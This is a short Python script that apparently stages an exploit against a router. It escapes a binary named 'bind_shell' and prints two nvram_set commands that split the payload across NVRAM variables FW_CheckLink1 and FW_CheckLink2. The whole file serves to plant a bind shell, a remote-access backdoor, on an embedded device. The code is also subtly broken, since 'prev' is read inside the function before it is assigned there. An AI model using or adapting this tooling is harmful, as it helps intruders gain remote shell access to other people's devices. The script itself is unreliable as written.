import binascii
import string

good = string.printable[:-5]
good = bytes(good.replace("'",""),"utf-8")

prev = -1
def convert_bytestring(s):
    out = ""
    for c in s:
        if c in good and prev != 0:
            out += chr(c)
        elif c == 0:
            out += r"\0"
        else:
            out += rf"\x{hex(c)[2:].zfill(2)}"
        prev = c
    return out

data = open("bind_shell", "rb").read()

first_half = data[:len(data)//2]
second_half = data[len(data)//2:]

assert first_half + second_half == data

first_half_out = convert_bytestring(first_half)
second_half_out = convert_bytestring(second_half)
print(f"nvram_set 2860 FW_CheckLink1 '{first_half_out}'")
print(f"nvram_set 2860 FW_CheckLink2 '{second_half_out}'")
